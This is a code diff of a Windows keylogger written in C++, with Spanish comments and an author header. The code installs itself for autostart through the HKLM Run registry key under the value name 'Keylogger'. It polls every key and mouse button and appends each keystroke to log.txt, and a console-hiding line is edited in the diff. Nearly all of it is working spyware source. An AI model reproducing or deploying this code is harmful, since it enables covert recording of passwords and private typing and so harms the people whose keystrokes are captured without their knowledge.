@@ -1,28 +1,40 @@
+//Creado por: Abraham Meza
+//Fecha de creación: 2/7/17 7:00 p.m
+//Última modificación: 1/4/18 9:25 p.m.
+//Versión: C++
+
 #define _WIN32_WINNT 0x0500		//Consola
 #include <iostream>
 #include <string>
 #include <map>
 #include <windows.h>
+#include <winsock.h>
 
 using namespace std;
 
+/*
+Entrada: puntero ruta de tipo char
+Salida: void
+Funcionamiento: Crea una clave de registro para ejecutar el autoarranque del programa
+*/
 void crearKey(char *ruta){	//Autoarranque
-	
+
 	int regKey;
 	HKEY hkey;
-	
+
 	regKey = RegCreateKey(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &hkey);
-	
+
 	if(regKey == 0){
-		
+
 		RegSetValueEx((HKEY)hkey, "Keylogger", 0, REG_SZ, (BYTE*)ruta, strlen(ruta));
-		
+
 	}
 }
 
+//Programa principal
 int main(int argc, char *argv[]){
 
-	//ascii	
+	//ASCII
 	map<int, string> ch;
     ch[1] = " [Click Izq] ";
     ch[2] = " [Click Der] ";
@@ -120,48 +132,48 @@ int main(int argc, char *argv[]){
     ch[221] = "¡";
     ch[222] = "´";
     ch[226] = "<";
-    
+
     FILE *f;
     int count = 0;
-    
+
     HWND hwnd = GetConsoleWindow();
-    ShowWindow(hwnd, 0);	//Ocultar consola
-    
+    ShowWindow(hwnd, 1);	//Ocultar consola
+
     crearKey(argv[0]);
-	
+
 	while(true){
-		
+
 		for (int i = 0; i < 256; i++){
-			
+
 			if(GetAsyncKeyState(i) == -32767){	//Detección
-				
+
 				f = fopen("log.txt", "a");
-				
+
 				if(f == NULL){
-					
+
 					exit(1);
-					
+
 				}
-				
-				if(count == 50){	//Espaciado
-					
+
+				if(count == 100){	//Espaciado
+
 					fputs("\n", f);
 					count = 0;
-					
+
 				}
-				
+
 				fputs(ch[i].c_str(), f);	//Escritura
-				
+
 				fclose(f);
-				
+
 				count++;
-				
+
 			}
-			
+
 		}
-		
+
 	}
-	
+
 	return 0;
-	
+
 }
